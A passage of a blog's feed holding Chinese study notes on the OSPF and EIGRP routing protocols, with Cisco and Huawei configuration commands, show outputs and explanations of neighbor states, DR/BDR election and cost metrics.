加载：使用LSR/LSU/LSack来获取未知的LSA信息</p><p>lsr–请求列表-针对每一条发送lsu</p><p>lsu–重传列表-对方收到lsu后发送ack确认，如果没收到，则重发</p><p>full转发:邻接关系建立的标志</p><h5 id="5、OSPF工作方式"><a href="#5、OSPF工作方式" class="headerlink" title="5、OSPF工作方式"></a>5、OSPF工作方式</h5><p>启动宣告配置完成后，路由器开始组播（224.0.0.5）收发OSPF的hello包；若接收到的hello包中存在本地的route-id，建立邻居关系，生成邻居表；</p><p>之后基于表格中所有的邻居进行条件的匹配，匹配失败将维持邻居关系，仅hello包周期保活即可；</p><p>匹配成功者间可以建立邻接关系；邻居间使用DBD进行数据库目录的比对；之后使用LSR查询目录中未知的LSA信息，对端使用LSU来携带传递LSA，最终需要LSack进行接收确认；</p><p>当本地收集到区域内所有设备的LSA后，生成LSDB—链路状态数据库表；</p><p>本地基于LSDB启用SFP算法，计算到达所有未知网段的最短路径，然后将其加载到路由表内；</p><p>收敛完成，仅hello包周期保活所有的邻居和邻接关系；每30MIN周期进行DBD包的收发来进行纠错；</p><p>结构突变：</p><p>新增网段—直连新增网段设备使用DBD来告知所有的邻居，邻居进行LSR/LSU/LSACK收敛</p><p>断开网段—断开新增网段设备使用DBD来告知所有的邻居，邻居进行LSR/LSU/LSACK收敛</p><p>无法沟通—-dead time 和最大老化来解决</p><p>正常邻居间存在hello包，若超过dead time依然没有hello包，断开邻居关系，删除从该邻居处学习到的所有信息</p><p>若邻居关系依然正常，但每30min的周期没有正常进行，每条lsa后方存在一个老化时间，默认最大为3609s；到达最大老化时删除该LSA信息即可；</p><p>名词：</p><p>Router-ID：路由器标示符，用于标识该路由器在OSPF网络中的唯一性</p><p>选举规则：1.手工指定最优先    2.最大的环回接口地址  3.最大的物理接口</p><p>hello时间、dead时间：默认10、40或 30、120s</p><p>DR优先级 ：</p><p>DR：指定路由器</p><p>BDR：备份指定路由器</p><p>LSA：链路状态通告；在不同条件下存在不同类别的LSA，用于携带拓扑或路由</p><p>LSDB：链路状态数据库；所有LSA的集合</p><p>OSPF收敛行为—OSPF的LSA洪泛</p><p>​                           OSPF的LSDB同步</p><p>OSPF邻居关系建立条件：</p><p>1.router-ID必须不同    </p><p>2.area-ID必须一致</p><p>3.认证类型和认证型数据都一致   </p><p>4.hello时间、dead时间都一致  </p><p>5.特殊区域标识必须一致  </p><p>6.若在MA网络中，network mask必须一致</p><p>7.必须同时使用单播或组播</p><h5 id="6、OSPF基础配置"><a href="#6、OSPF基础配置" class="headerlink" title="6、OSPF基础配置"></a>6、OSPF基础配置</h5><h6 id="（一）cisco"><a href="#（一）cisco" class="headerlink" title="（一）cisco"></a>（一）cisco</h6><p>r1(config)#router ospf 1   启动时需要配置进程号，仅具有本地意义</p><p>r1(config-router)#router-id 1.1.1.1   配置RID，要求为全网唯一</p><p>​                              手工—环回接口最大数字—物理接口最大数字</p><p>宣告：1、激活  2、路由或拓扑   3、区域划分</p><p>r1(config-router)#network 1.1.1.1 0.0.0.0 area 0</p><p>r1(config-router)#network 12.1.1.0 0.0.0.255 area 0</p><p>​                                   反掩码</p><p>启动配置完成后，所有设备间使用hello包，发现并建立邻居关系，生成邻居表：</p><p>Hello time 为10s，dead time 为 hello time 的4倍；</p><p>r2#show ip ospf neighbor </p><p>Neighbor ID     Pri   State           Dead Time   Address         Interface</p><p>1.1.1.1           0   FULL/  -        00:00:34    12.1.1.1        Serial1/0</p><p>3.3.3.3           0   FULL/  -        00:00:39    23.1.1.2        Serial1/1</p><p>邻居关系建立后，邻居间进行条件匹配，匹配成功者间进入邻接关系；基于DBD/LSR/LSU/LSack获取未知LSA信息，生成LSDB–数据库表；</p><p>r2#show ip ospf database </p><p>LSDB同步完成后，本地使用SPF最短路径选路规则，将到达未知网段的路由加载路由表：</p><p>使用字母O标识通过OSPF学习的路由；</p><p>O      本地区域内的路由，是本地通过拓扑计算所得</p><p>O IA    域间路由，其他区域的路由，通过ABR共享进入的</p><p>管理距离为110；度量为cost值=开销值=参考带宽/接口带宽</p><p>默认参考带宽为100M；整段路径cost值之和最小为最佳路径；</p><p>注：当接口带宽大于参考带宽时，cost值为1；将可能导致选路不佳，建议修改参考带宽</p><p>r1(config)#router ospf 1 </p><p>r1(config-router)#auto-cost reference-bandwidth ?    </p><p>  <1-4294967>  The reference bandwidth in terms of Mbits per second</1-4294967></p><p>r1(config-router)#auto-cost reference-bandwidth 1000</p><p>切记：整个网络所有设备均需要修改一致；</p><p>【5】OSPF建立成为邻接关系的条件—-关注网络类型</p><p>点到点–在一个网段内只能存在两个节点</p><p>MA网络—在一个网段内节点数量不限制</p><p>在点到点网络ospf只能直接建立邻接关系；</p><p>在MA网络中为避免重复的更新，将进行DR/BDR选举，所有的非DR/BDR间仅建立邻居关系；DR/BDR与其他非DR/BDR建立邻接关系，基于224.0.0.6沟通；</p><p>选举规则：</p><p>比较接口优先级  0-255 大优  默认为1；</p><p>接口优先级若相同，比较RID；</p><p>r1(config)#interface fastEthernet 0/0</p><p>r1(config-if)#ip ospf priority 3  修改接口优先级</p><p>注：ospf选择非抢占的，因此在人为修改了优先级后，必须重启所有设备的OSPF进程</p><p>r1#clear ip ospf process </p><p>Reset ALL OSPF processes? [no]: yes</p><p>可以将设备的参选接口优先级修改为0,—-不参选；但至少留一台设备参选，否则将无DR,网络无法通行；</p><h6 id="（二）华为"><a href="#（二）华为" class="headerlink" title="（二）华为"></a>（二）华为</h6><p>[r1]ospf 1 router-id 1.1.1.1  启动时需要定义进程号，仅具有本地意义；  建议同时配置ROUTER-ID；</p><p>​                      手工—环回最大数值IP地址—物理接口最大数值IP地址</p><p>宣告：</p><p>[r2]ospf 1 router-id 2.2.2.2</p><p> [r2-ospf-1]area 0</p><p> [r2-ospf-1-area-0.0.0.0]network 12.1.1.2 0.0.0.0</p><p> [r2-ospf-1]area 1 </p><p> [r2-ospf-1-area-0.0.0.1]network 23.1.1.1 0.0.0.0</p><p>OSPF的区域划分规则：</p><p>星型结构—所有的非骨干区域必须连接到的骨干区域，否则不能进行区域间路由共享</p><p>ABR—区域边界路由器  同时工作的多个区域间；合法ABR必须同时工作在骨干区域，否则不能进行区域间的路由共享；</p><p>启动配置完成后，路由器间使用hello包收发建立邻居关系，生成邻居表：</p><p>[r2]display ospf peer</p><p>Area 0.0.0.0 interface 12.1.1.2(GigabitEthernet0/0/0)’s neighbors</p><p> Router ID: 1.1.1.1          Address: 12.1.1.1        </p><p>   State: Full  Mode:Nbr is  Slave  Priority: 1</p><p>   DR: 12.1.1.1  BDR: 12.1.1.2  MTU: 0    </p><p>   Dead timer due in 35  sec </p><p>   Retrans timer interval: 5 </p><p>   Neighbor is up for 00:18:48     </p><p>   Authentication Sequence: [ 0 ]</p><p>邻居关系建立后，邻居间进行条件的匹配；匹配成功建立邻接关系，同步LSDB完成后，本地生成LSDB—数据库表；</p><p>[r2]display ospf lsdb   查看数据库的目录；内部存在各种类别的信息，需要具体查看</p><p>LSDB同步完成后，本地基于SFP算法，计算到达所有未知网段的最短路径，然后将其加载到路由表中；</p><p>[r3]display  ip routing-table  查看路由表</p><p>Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface</p><p>​        1.1.1.1/32  OSPF    10   2           D   23.1.1.1        GigabitEthernet0/0/0</p><p>​        2.2.2.2/32  OSPF    10   1           D   23.1.1.1        GigabitEthernet0/0/0</p><p>[r3]display ip routing-table protocol ospf  查看本地所有通过OSPF协议学习到的路由</p><p>[r1]display ospf routing    查看本地工作OSPF的直连，及本地通过OSPF学习到的路由</p><p>Destination        Cost  Type       NextHop         AdvRouter       Area</p><p> 1.1.1.1/32         0     Stub       1.1.1.1         1.1.1.1         0.0.0.0</p><p> 12.1.1.0/24        1     Transit     12.1.1.1        1.1.1.1         0.0.0.0</p><p> 2.2.2.2/32         1     Stub       12.1.1.2        2.2.2.2         0.0.0.0</p><p> 3.3.3.3/32         2     Inter-area  12.1.1.2        2.2.2.2         0.0.0.0</p><p> 23.1.1.0/24        2     Inter-area  12.1.1.2        2.2.2.2         0.0.0.0</p><p>  类型标记为Inter-area 代表其他区域产生的路由条目</p><p>OSPF的度量值为cost=开销值=参考带宽/接口带宽</p><p>默认的参考带宽为100M；OSPF默认优选整段路径cost之和最小；</p><p>若接口带宽大于参考带宽，cost值为1；将可能导致选路的不佳，建议修改默认的参考带宽；</p><p>[r1]ospf 1</p><p>[r1-ospf-1]bandwidth-reference 1000</p><p>切记：一旦修改，全网所有设备均需修改为一致；</p><p>​             </p><p>​     </p><p>​      </p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;一、动态路由协议&quot;&gt;&lt;a href=&quot;#一、动态路由协议&quot; class=&quot;headerlink&quot; title=&quot;一、动态路由协议&quot;&gt;&lt;/a&gt;一、动态路由协议&lt;/h4&gt;&lt;p&gt;1、动态路由协议：直连路由间构建邻居关系，通过相互沟通学习路由信息，来获取未知的路由信息，然后根据不同的路由选择算法，计算到达未知网段的最佳路径，并将其加载到路由表中。&lt;/p&gt;
    
    </summary>
    
      <category term="CCNP/HCNP" scheme="http://soliym.top/categories/CCNP-HCNP/"/>
    
    
      <category term="OSPF" scheme="http://soliym.top/tags/OSPF/"/>
    
  </entry>
  
  <entry>
    <title>EIGRP增强内部网关路由协议简述</title>
    <link href="http://soliym.top/2019/09/02/EIGRP%E5%A2%9E%E5%BC%BA%E5%86%85%E9%83%A8%E7%BD%91%E5%85%B3%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE%E7%AE%80%E8%BF%B0/"/>
    <id>http://soliym.top/2019/09/02/EIGRP增强内部网关路由协议简述/</id>
    <published>2019-09-02T09:14:50.548Z</published>
    <updated>2019-09-02T09:14:50.548Z</updated>
    
    <content type="html"><![CDATA[<p><strong>EIGRP：增强内部网关路由协议</strong> <strong>— cisco</strong>私有的协议</p><p>无类别距离矢量协议，协议号88；组播更新：224.0.0.10</p><p>增量更新—仅触发、无周期更新—–可靠性、更新量小</p><p>支持非等开销负载均衡</p> <a id="more"></a><p>AD        本地下一跳到达目标的度量</p><p>FD       本地到达目标的度量</p><p>S         最佳路径的下一跳路由器</p><p>FS       备份路径的下一跳路由器</p><p>FC       可行性条件，成为备份路径的条件</p><p>【1】EIGRP的数据包</p><p>Hello 包       用于邻居发现、建立、保活   hello time  5s</p><p>Update包         路由条目–目标网络号+度量值</p><p>查询包                    查询路径，最佳路径和备份路径—-非等开销负载均衡</p><p>应答包         查询确认</p><p>ACK            </p><p>【2】EIGRP的4大组件 组建</p><p>Hello机制—-认识所有邻居</p><p>PDM —-支持多种网络层协议 （协议有关单元） 协议无关单元 IPX appletalk</p><p>RTP–可靠传输协议—-借鉴TCP的4种可靠机制–确认、重传、排序、流控（不能超过链路带宽的百分之50）</p><p>DUAL—扩散更新（弥散更新）算法</p><p>【3】EIGRP的工作过程</p><p>启动配置后，运行EIGRP协议的路由器，通过组播224.0.0.10向所有的邻居发送hello包；收到邻居的hello包后及表示认识了邻居，生成邻居表；</p><p>邻居关系建立后，邻居间使用更新包进行路由信息的共享；</p><p>收集到所有的路由条目后，本地生成–拓扑表；—装载所有的最佳和备份路径；</p><p>本地默认将拓扑表中的最佳路径全部加载到路由表内；—收敛完成</p><p>结构突变：</p><p>新增网段—直连新增网段的设备，使用更新包告知所有邻居即可</p><p>断开网段—-直连断开网段的设备，发出查询包，通过DUAL，收集应答包来重新收敛</p><p>无法沟通—-hello time 5s   hold time 15s</p><p>更新包、查询包、应答包–均被RTP服务    </p><p>接收到这三种包时，需要ACK来确认，若未进行确认将单播重传，最大16次，若依然失败断开邻居关系；RTP在转发这三种包时，还会对其进行排序和流控；</p><p>【4】EIGRP的配置</p><p>r1(config)#router eigrp ?    启动时需要配置AS号</p><p>  <1-65535>  Autonomous system number</1-65535></p><p>r1(config)#router eigrp 90   此处理解为全网一致的进程号；</p><p>r1(config-router)#   </p><p>r1(config-router)#no auto-summary   关闭自动汇总</p><p>宣告：激活     路由</p><p>r1(config-router)#network 1.0.0.0</p><p>r1(config-router)#network 124.1.1.1 0.0.0.0</p><p>EIGRP宣告时，可以向rip一样直接配置主类，也可以像OSPF一样使用反掩码进行匹配</p><p>启动配置完成后，邻居间使用hello包建立邻居关系，生成邻居表：</p><p>r2#show ip eigrp neighbors </p><p>IP-EIGRP neighbors for process 90</p><p>H   Address                 Interface       Hold Uptime   SRTT   RTO  Q  Seq</p><p>​                                            (sec)         (ms)       Cnt Num</p><p>2   124.1.1.4               Fa0/0             10 00:01:59   28   200  0  11</p><p>1   23.1.1.2                Se1/1             13 00:02:14   39   234  0  11</p><p>0   124.1.1.1               Fa0/0             13 00:02:19  389  2334  0  7</p><p>邻居关系建立后，邻居间使用更新包收敛路由信息，生成拓扑表：</p><p>本地到达邻居的最佳和备份路径；</p><p>r3(config)#interface s1/1</p><p>r3(config-if)#bandwidth 800   修改接口参考带宽</p><p>一个接口的实际传输带宽—-硬件、QOS；参考带宽并不影响实际传输带宽，只影响路由协议的选路；</p><p>r3#show ip eigrp topology </p><p>IP-EIGRP Topology Table for AS(90)/ID(3.3.3.3)</p><p>Codes: P - Passive, A - Active, U - Update, Q - Query, R - Reply,</p><p>​       r - reply Status, s - sia Status </p><p>P 1.1.1.0/24, 1 successors, FD is 2300416</p><p>​        via 23.1.1.1 (2300416/156160), Serial1/0   最佳</p><p>​        via 34.1.1.2 (3842560/156160), Serial1/1   备份</p><p>​                    FD      AD</p><p>FD可行距离 —- 本地通过该路径到达目标的度量</p><p>AD可行后继距离（通告距离）—-本地的下一跳到达目标的度量值</p><p>FC可行条件—-成为备份路径的条件  备份的AD小于不等于最佳路径的FD值</p><p>备份路径的意义在于可以和最佳路径一起完成非等开销负载均衡；</p><p>非等开销负载均衡：当到达一个目标地址时，若存在两条开销相近的路径时，可以让设备将流量按比例延这些路径同时传输，提高链路的利用率；</p><p>差异值：备份的FD/最佳路径的FD=向上取整</p><p>设备默认的差异值规定为1，标示仅支持等开销负载均衡</p><p>r3#show ip protocols </p><p>  EIGRP maximum metric variance 1</p><p>可以通过修改差异值，来实现非等开销负载均衡</p><p>r3(config)#router eigrp 90</p><p>r3(config-router)#variance 2</p><p>r3#show ip route 1.1.1.0</p><p>默认设备将最佳路径加载于路由表中：</p><p>D - EIGRP, EX - EIGRP external</p><p>使用字母D标示正常EIGRP学习的路由；</p><p>管理距离为90；</p><p>度量：复合度量—–各种参数</p><p>度量计算公式：存在权重值  </p><p>Formula with default K values (K1 = 1, K2 = 0, K3 = 1, K4 = 0, K5 = 0):</p><p>当K5为0时：</p><p>Metric = [K1 <em> BW + ((K2 </em> BW) / (256 – load)) + K3 * delay]</p><p>当K5大于0时:</p><p>Metric = [K1 <em> BW + ((K2 </em> BW) / (256 – load)) + K3 <em> delay]</em> [K5 / (reliability + K4)]</p><p>带宽 可靠性 延迟 负载 MTU</p><p>默认k值下度量计算为带宽+延时：</p><p>带宽=（10^7/整路径最小带宽）*256</p><p>延时=（整段路径入口的延时之和/10）*256</p><p>256为放大因子—-1、放大参数便于比较  2、兼容IGRP</p><p>【5】EIGRP的扩展配置</p><p>认证</p><p>r2(config)#key chain a</p><p>r2(config-keychain)#key 1</p><p>r2(config-keychain-key)#key-string cisco123</p><p>r2(config)#interface s1/1</p><p>r2(config-if)#ip authentication key-chain eigrp 90 a</p><p>r2(config-if)#ip authentication mode eigrp 90 md5 </p><p>注：EIGRP仅支持MD5认证，故在没有修改模式前，认证是无意义的</p><p>手工汇总–在更新源路由器上，所有更新发出接口上进行配置</p><p>r3(config)#interface s1/0</p><p>r3(config-if)#ip summary-address eigrp 90 3.3.2.0 255.255.254.0 </p><p>汇总配置完成后，在汇总设备上将自动产生指向汇总地址的空接口防环路由</p><p>被动接口–只接收不发送路由协议信息</p><p>​            用于连接用户的接口，不能用于连接邻居的接口</p><p>r3(config)#router eigrp 90</p><p>r3(config-router)#passive-interface loopback 0</p><p>加快收敛  hello 5s     hold time15s</p><p>r3(config)#interface s1/1</p><p>r3(config-if)#ip hello-interval eigrp 90 5</p><p>r3(config-if)#ip hold-time eigrp 90 15</p><p>缺省路由—在边界路由器上向所有直连内网的接口上进行汇总配置，汇总地址0.0.0.0/0；</p><p>​             但边界路由器需要静态缺省指向ISP</p><p>r1(config)#interface fastEthernet 0/0</p><p>r1(config-if)#ip summary-address eigrp 90 0.0.0.0 0.0.0.0</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;EIGRP：增强内部网关路由协议&lt;/strong&gt; &lt;strong&gt;— cisco&lt;/strong&gt;私有的协议&lt;/p&gt;
&lt;p&gt;无类别距离矢量协议，协议号88；组播更新：224.0.0.10&lt;/p&gt;
&lt;p&gt;增量更新—仅触发、无周期更新—–可靠性、更新量小&lt;/p&gt;
&lt;p&gt;支持非等开销负载均衡&lt;/p&gt;
    
    </summary>
    
      <category term="CCNA" scheme="http://soliym.top/categories/CCNA/"/>
    
    
      <category term="EIGRP" scheme="http://soliym.top/tags/EIGRP/"/>
    
  </entry>
  
  <entry>
    <title>OSPF开放最短路径优先协议简述</title>
    <link href="http://soliym.top/2019/09/02/OSPF%E5%BC%80%E6%94%BE%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E4%BC%98%E5%85%88%E5%8D%8F%E8%AE%AE%E7%AE%80%E8%BF%B0/"/>
    <id>http://soliym.top/2019/09/02/OSPF开放最短路径优先协议简述/</id>
    <published>2019-09-02T09:12:08.004Z</published>
    <updated>2019-09-02T09:12:08.008Z</updated>
    
    <content type="html"><![CDATA[<h5 id="一、开放式最短路径优先协议"><a href="#一、开放式最短路径优先协议" class="headerlink" title="一、开放式最短路径优先协议"></a>一、开放式最短路径优先协议</h5><p> OSPF(Open Shortest Path First)是一个内部网关协议(Interior Gateway Protocol,简称IGP)。与RIP相对，OSPF是链路状态路由协议，而RIP是距离向量路由协议。链路是路由器接口的另一种说法，因此OSPF也称为接口状态路由协议。OSPF通过路由器之间通告网络接口的状态来建立链路状态数据库，生成最短路径树，每个OSPF路由器使用这些最短路径构造路由表。</p><a id="more"></a><p>OSPFv2用于ipv4网络，OSPFv3用在ipv6网络。可用于大型网络。</p><h5 id="二、基本概念"><a href="#二、基本概念" class="headerlink" title="二、基本概念"></a>二、基本概念</h5><p><strong>链路状态</strong></p><p>OSPF路由器收集其所在网络区域上各路由器的连接状态信息，即链路状态信息（Link-State），生成链路状态数据库(Link-State Database)。路由器掌握了该区域上所有路由器的链路状态信息，也就等于了解了整个网络的拓扑状况。OSPF路由器利用“最短路径优先算法(Shortest Path First, SPF)”，独立地计算出到达任意目的地的路由。</p><p><strong>区域</strong></p><p>OSPF协议引入“分层路由”的概念，将网络分割成一个“主干”连接的一组相互独立的部分，这些相互独立的部分被称为“区域”(Area)，“主干”的部分称为“主干区域”。每个区域就如同一个独立的网络，该区域的OSPF路由器只保存该区域的链路状态。每个路由器的链路状态数据库都可以保持合理的大小，路由计算的时间、报文数量都不会过大。</p><p><strong>共有五种区域的主要区别在于它们和外部路由器间的关系：</strong></p><p><strong>标准区域</strong>: 一个标准区域可以接收链路更新信息和路由总结。</p><p><strong>主干区域</strong>(传递区域):主干区域是连接各个区域的中心实体。主干区域始终是“区域0”，所有其他的区域都要连接到这个区域上交换路由信息。主干区域拥有标准区域的所有性质。</p><p><strong>存根区域</strong>（stub Area）：存根区域是不接受自治系统以外的路由信息的区域。如果需要自治系统以外的路由，它使用默认路由0.0.0.0。</p><p><strong>完全存根区域</strong>：它不接受外部自治系统的路由以及自治系统内其他区域的路由总结。需要发送到区域外的报文则使用默认路由：0.0.0.0。完全存根区域是Cisco自己定义的。 </p><p><strong>不完全存根区域**</strong>(NSAA)**: 它类似于存根区域，但是允许接收以LSA Type 7发送的外部路由信息，并且要把LSA Type 7转换成LSA Type 5。</p><p>OSPF中的四种路由器</p><p>在OSPF多区域网络中，路由器可以按不同的需要同时成为以下四种路由器中的几种： </p><p>\1. 内部路由器：所有端口在同一区域的路由器，维护一个链路状态数据库。 </p><p>\2. 主干路由器：具有连接主干区域端口的路由器。 </p><p>\3. 区域边界路由器(ABR)：具有连接多区域端口的路由器，一般作为一个区域的出口。ABR为每一个所连接的区域建立链路状态数据库，负责将所连接区域的路由摘要信息发送到主干区域，而主干区域上的ABR则负责将这些信息发送到各个区域。 </p><p>\4. 自治域系统边界路由器(ASBR)：至少拥有一个连接外部自治域网络（如非OSPF的网络）端口的路由器，负责将非OSPF网络信息传入OSPF网络。</p><p>OSPF路由器之间交换链路状态公告(LSA)信息。OSPF的LSA中包含连接的接口、使用的Metric及其他变量信息。OSPF路由器收集链接状态信息并使用SPF算法来计算到各节点的最短路径。</p><p><strong>协议类型</strong></p><p>Hello报文，通过周期性地发送来发现和维护邻接关系；     </p><p>​            存在router ID—-RID 全网唯一的编号，使用ip地址</p><p>DBD(链路状态数据库描述)报文，描述本地路由器保存的LSDB(链路状态数据库)；</p><p>LSR(LS Request)报文，向邻居请求本地没有的LSA；</p><p>LSU(LS Update)报文，向邻居发送其请求或更新的LSA；</p><p>LSAck(LS ACK)报文，收到邻居发送的LSA后发送的确认报文。</p><p>OSPF网络类型</p><p>根据路由器所连接的物理网络不同，OSPF将网络划分为四种类型：广播多路访问型（Broadcast multiAccess）、非广播多路访问型（None Broadcast MultiAccess，NBMA）、点到点型（Point-to-Point）、点到多点型（Point-to-MultiPoint）。 </p><p>指派路由器（DR）和备份指派路由器（BDR）</p><p>在多路访问网络上可能存在多个路由器，为了避免路由器之间建立完全相邻关系而引起的大量开销，OSPF要求在区域中选举一个DR。每个路由器都与之建立完全相邻关系。DR负责收集所有的链路状态信息，并发布给其他路由器。选举DR的同时也选举出一个BDR，在DR失效的时候，BDR担负起DR的职责。 </p><p>点对点型网络不需要DR，因为只存在两个节点，彼此间完全相邻。 协议组成OSPF协议由Hello协议、交换协议、扩散协议组成。</p><p>当路由器开启一个端口的OSPF路由时，将会从这个端口发出一个Hello报文，以后它也将以一定的间隔周期性地发送Hello报文。OSPF路由器用Hello报文来初始化新的相邻关系以及确认相邻的路由器邻居之间的通信状态。 </p><p>对广播型网络和非广播型多路访问网络，路由器使用Hello协议选举出一个DR。在广播型网络里，Hello报文使用多播地址224.0.0.5周期性广播，并通过这个过程自动发现路由器邻居。在MA网络中，DR负责向其他路由器逐一发送Hello报文。</p><h5 id="三、工作原理"><a href="#三、工作原理" class="headerlink" title="三、工作原理"></a>三、工作原理</h5><p>一般用于同一个路由域内。在这里，路由域是指一个自治系统（Autonomous System），即AS，它是指一组通过统一的路由政策或路由协议互相交换路由信息的网络。在这个AS中，所有的OSPF路由器都维护一个相同的描述这个AS结构的数据库，该数据库中存放的是路由域中相应链路的状态信息，OSPF路由器正是通过这个数据库计算出其OSPF路由表的。</p><h5 id="四、工作工程"><a href="#四、工作工程" class="headerlink" title="四、工作工程"></a>四、工作工程</h5><h6 id="1、数据包"><a href="#1、数据包" class="headerlink" title="1、数据包"></a>1、数据包</h6><p>5种基本数据包</p><p>HELLO—邻居的发现、建立、保活</p><p>DBD—–数据库描述包—数据库目录信息</p><p>LSR—–链路状态请求</p><p>LSU—–链路状态更新—携带各种LSA</p><p>LSACK—链路状态确认</p><h5 id="2、OSPF的状态机–描述接口状态"><a href="#2、OSPF的状态机–描述接口状态" class="headerlink" title="2、OSPF的状态机–描述接口状态"></a>2、OSPF的状态机–描述接口状态</h5><p>Down：本地一旦发出hello包，进入下一状态</p><p>Init–初始化：本地接收到的hello包中若存在本地的RID，进入下一状态</p><p>2way–双向通信：邻居关系建立的标志</p><p>条件匹配：点到点网络直接进入下一个状态；MA网络将进行DR/BDR选举（40s），非DR/BDR间不能进入下一个状态；</p><p>Exstart–预启动：使用类hello的BDB包进行主从关系选举，RID数值大为主，主从优先进入下一个状态。</p><p>Exchange–准交换：使用真正的BDB进行数据库目录的共享，需要ACK；</p><p>LOding–加载：使用LSR/LSU/LSack来获取未知的LSA信息；</p><p>Full–转发：邻接关系建立的标志；</p><h6 id="3、工作过程"><a href="#3、工作过程" class="headerlink" title="3、工作过程"></a>3、工作过程</h6><p>1、启动配置完成后，本地收发hello包，建立邻居关系，生成邻居表；</p><p>2、再进行条件的匹配，匹配失败将停留于邻居关系，仅hello包保活即可；</p><p>3、匹配成功者之间建立邻接关系，需要DBD共享数据库目录，LSR/LSU/LSack来获取未知的LSA信息，当收集完网络中所有的LSA后，生成数据表–LSDB</p><p>4、LSDB建立完成后，本地基于OSPF选路规则，计算本地到达所有未知网段的最短路径，然后将其加载到路由表中，完成收敛。</p><p>5、收敛完成后–hello包周期保活–30分钟周期的BDB比对，若不一致将会使用LSR/LSU/LSack重新获取</p><h6 id="4、配置"><a href="#4、配置" class="headerlink" title="4、配置"></a>4、配置</h6><p>配置</p><p>R1(config)#router ospf 100                    创建/进入OSPF进程100</p><p>R1(config-router)#router-id 1.1.1.1              指定Router-id，不指定则为环回地址，没有环回则为物理接                          口地址</p><p>R1(config-router)#network 12.1.1.1 0.0.0.0 area 0  可在接口内配置，IP ospd 100 area 0</p><p>​                    1、路由 2、激活 3、区域</p><p>OSPF三种表</p><p>邻居表</p><p>R2#show ip ospf neighbor</p><p>Neighbor ID     Pri   State           Dead Time   Address         Interface</p><p>1.1.1.1           1   FULL/DR         00:00:39    12.1.1.1        FastEthernet1/0</p><p>拓扑表</p><p>R2#show ip ospf database</p><p>​            OSPF Router with ID (2.2.2.2) (Process ID 100)</p><p>​                Router Link States (Area 0)</p><p>Link ID         ADV Router      Age         Seq#       Checksum Link count</p><p>1.1.1.1         1.1.1.1         90          0x80000005 0x00BF34 2</p><p>2.2.2.2         2.2.2.2         458         0x80000003 0x00BA04 3</p><p>​                Net Link States (Area 0)</p><p>Link ID         ADV Router      Age         Seq#       Checksum</p><p>12.1.1.1        1.1.1.1         470         0x80000001 0x004AD0</p><p> 路由表</p><p>R2#show ip ospf route</p><p>​            OSPF Router with ID (2.2.2.2) (Process ID 100)</p><p>​    Area BACKBONE(0)</p><p>​    Intra-area Route List</p><p>*   12.1.1.0/24, Intra, cost 1, area 0, Connected</p><p>​      via 12.1.1.2, FastEthernet1/0</p><p>*   23.1.1.0/24, Intra, cost 1, area 0, Connected</p><p>​      via 23.1.1.2, FastEthernet1/1</p><p>*&gt;  1.1.1.1/32, Intra, cost 2, area 0</p><p>​      via 12.1.1.1, FastEthernet1/0</p><p>*   2.2.2.2/32, Intra, cost 1, area 0, Connected</p><p>​      via 2.2.2.2, Loopback0</p><p>R2#show ip route ospf</p><p>​     1.0.0.0/32 is subnetted, 1 subnets</p><p>O       1.1.1.1 [110/2] via 12.1.1.1, 00:01:50, FastEthernet1/0</p><p>区域划分的规则：</p><p>星型结构 其他区域要和骨干域相连 </p><p>需要存在ABR 区域边界路由器</p><p>​                  通告者             内容</p><p>1类LSA  router  路由器本身         链路状态</p><p>2类LSA  network   DR             描述MA网络</p><p>3类LSA  sumary   ABR             路由条目</p><p>成为邻接关系的条件</p><p>1、如果在串行链路上 直接形成邻接关系</p><p>2、如果是以太网环境 只和DR/BDR形成邻接关系</p><p>选举规则</p><p>先比较优先级  越大越优先</p><p>比较Router-ID 越大越优先</p><p>非抢占性</p><p>修改优先级</p><p>R1(config)#int f0/0</p><p>R1(config-if)#ip ospf priority 2</p><p>干涉选择方法：</p><p>修改DR优先级最大，BDR次大；该选举非抢占，故必须手动重启所有设备进程</p><p>R2#clear ip ospf process </p><p>Reset ALL OSPF processes? [no]: y</p><p>修改DR优先级最大，BDR次大；将其他路由器修改为0</p><p>扩展配置：</p><p>认证</p><p>明文认证：</p><p>R2(config)#int s1/0</p><p>R2(config-if)#ip ospf authentication</p><p>R2(config-if)#ip ospf authentication-key 1 cisco</p><p>密文认证：</p><p>R2(config)#int f0/0</p><p>R2(config-if)#ip ospf authentication message-digest </p><p>R2(config-if)#ip ospf message-digest-key 1 md5 cisco</p><p>区域明文认证：</p><p>R3(config)#router ospf 100</p><p>R3(config-router)#area 0 authentication </p><p>区域密文认证：</p><p>R1(config)#router ospf 100</p><p>R1(config-router)#area 1 authentication message-digest </p><p>被动接口</p><p>R1(config)#router ospf 100</p><p>R1(config-router)#passive-interface loopback 0</p><p>加快收敛速度</p><p>R1(config)#int s1/1</p><p>R1(config-if)#ip ospf hello-interval 5     修改hello时间为5s dead time自动四倍关系</p><p>R1(config-if)#ip ospf dead-interval 20</p><p>链路两端必须一致</p><p>缺省路由</p><p>R1(config)#router ospf 100</p><p>R1(config-router)#default-information originate </p><p>需要有缺省路由指向ISP</p><p>R1(config)#ip route 0.0.0.0 0.0.0.0 loopback 10</p><p>强制下放缺省</p><p>R1(config)#router ospf 100</p><p>R1(config-router)#default-information originate always</p>]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;一、开放式最短路径优先协议&quot;&gt;&lt;a href=&quot;#一、开放式最短路径优先协议&quot; class=&quot;headerlink&quot; title=&quot;一、开放式最短路径优先协议&quot;&gt;&lt;/a&gt;一、开放式最短路径优先协议&lt;/h5&gt;&lt;p&gt; OSPF(Open Shortest Path First)是一个内部网关协议(Interior Gateway Protocol,简称IGP)。与RIP相对，OSPF是链路状态路由协议，而RIP是距离向量路由协议。链路是路由器接口的另一种说法，因此OSPF也称为接口状态路由协议。OSPF通过路由器之间通告网络接口的状态来建立链路状态数据库，生成最短路径树，每个OSPF路由器使用这些最短路径构造路由表。&lt;/p&gt;
    
    </summary>
    
      <category term="CCNA" scheme="http://soliym.top/categories/CCNA/"/>
    
    
      <category term="OSPF" scheme="http://soliym.top/tags/OSPF/"/>
    
  </entry>
  
</feed>
